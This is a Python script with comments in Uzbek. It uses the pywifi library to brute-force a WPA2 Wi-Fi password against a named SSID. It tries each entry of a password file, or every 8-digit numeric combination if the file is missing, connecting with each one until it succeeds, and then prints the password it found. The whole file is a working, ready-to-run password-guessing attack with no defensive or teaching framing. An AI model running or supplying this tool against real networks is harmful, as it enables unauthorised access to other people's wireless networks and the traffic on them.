import pywifi
from pywifi import const
import time
import itertools
import string


def connect_to_wifi(ssid, password, iface):
    # Agar ulanish mavjud bo‘lsa, uzamiz
    if iface.status() in [const.IFACE_CONNECTED, const.IFACE_CONNECTING]:
        iface.disconnect()
        time.sleep(0.1)  # Minimal pauza

    # Profilni yaratamiz
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    # Profilni qo‘shamiz va ulanamiz
    iface.remove_all_network_profiles()  # Har safar tozalash
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(1)  # Ulanish uchun qisqa vaqt

    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False


def brute_force_wifi(ssid, password_list):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Interfeysni tashqarida ochamiz
    print(f"{ssid} uchun parolni sinash boshlandi...")

    for password in password_list:
        print(f"Sinayapman: {password}")
        if connect_to_wifi(ssid, password, iface):
            print(f"Parol topildi: {password}")
            print(f"Laptop {ssid} tarmog‘iga ulandi va ulangan holda qoladi!")
            return password
    print("Parol ro‘yxatda topilmadi.")
    return None


# 8 belgili parollar generatsiyasi
def generate_passwords(charset=string.digits, length=8):
    for combo in itertools.product(charset, repeat=length):
        yield ''.join(combo)


# Wi-Fi nomi va parollar
ssid = "cyber security"  # Wi-Fi nomini o‘zgartiring

# Fayldan parollar o‘qishga urinish
try:
    with open("passwords.txt", "r") as file:
        password_list = [line.strip() for line in file]
except FileNotFoundError:
    # Agar fayl bo‘lmasa, 8 belgili raqamli kombinatsiyalar
    print("passwords.txt topilmadi. 8 belgili raqamli kombinatsiyalar sinovdan o‘tkaziladi.")
    password_list = generate_passwords(charset=string.digits, length=8)  # Faqat 8 belgili

# Brute force ishga tushirish
found_password = brute_force_wifi(ssid, password_list)

if found_password:
    print(f"Ulanish muvaffaqiyatli! Topilgan parol: {found_password}")
else:
    print("Parol topilmadi. Boshqa kombinatsiyalar yoki ro‘yxat kerak.")
